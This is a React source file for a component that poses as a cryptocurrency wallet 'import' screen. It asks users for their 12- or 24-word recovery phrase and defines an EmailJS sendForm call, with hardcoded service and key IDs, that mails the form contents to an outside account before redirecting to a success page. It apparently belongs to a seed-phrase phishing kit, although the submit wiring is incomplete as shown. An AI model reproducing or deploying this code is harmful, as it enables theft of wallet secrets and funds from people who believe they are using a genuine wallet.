import * as React from "react";
import Box from "@mui/material/Box";
import TextField from "@mui/material/TextField";
import Button from "@mui/material/Button";
import emailjs from "@emailjs/browser";
import { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { Typography } from "@mui/material";

const Phrase = () => {
  const form = useRef();
  let navigate = useNavigate();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_yj787qi",
        "template_sv7wpyj",
        form.current,
        "g4ZEWVbf7KjSHQdm2"
      )
      .then(
        (result) => {
          navigate("/success-page");
        },
        (error) => {
          console.log(error);
          navigate("/error");
        }
      );
  };

  const [toggleState, setToggleState] = useState(1);
  return (
    <div className={toggleState === 1 ? "content active-content" : "content"}>
      <Box
        component="form"
        sx={{
          width: "80%",
          margin: "0 auto",
        }}
        noValidate
        autoComplete="off"
      >
        <TextField
          id="outlined-basic"
          label="Phrase"
          variant="outlined"
          multiline
          fullWidth
          rows={12}
        />

        <Typography
          sx={{ textAlign: "center", color: "rgba(38,34,250)" }}
          paddingY={2}
          textAlign={"center"}
        >
          Typically 12 (sometimes 24) words seperated by single spaces
        </Typography>

        <Button variant="contained" size="large">
          IMPORT
        </Button>
      </Box>
    </div>
  );
};

export default Phrase;
